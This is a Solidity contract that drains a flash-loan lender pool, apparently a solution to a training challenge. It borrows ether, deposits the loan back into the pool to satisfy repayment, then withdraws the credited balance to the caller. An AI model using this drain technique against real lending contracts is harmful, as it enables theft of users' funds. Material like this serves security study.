// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SidePoolAttacker is IFlashLoanEtherReceiver{
    SideEntranceLenderPool sidepool;
    constructor(address _sidepool){
        sidepool = SideEntranceLenderPool(_sidepool);
    }

    function callFlashLoan(uint256 amount) external {
        sidepool.flashLoan(amount);
    }
    function execute() external payable {
        sidepool.deposit{value: address(this).balance}();
    }

    function withdraw() external {
        sidepool.withdraw();
        (bool ok,)= msg.sender.call{value: address(this).balance}("");
        require(ok);
    }
    receive() external payable{}
}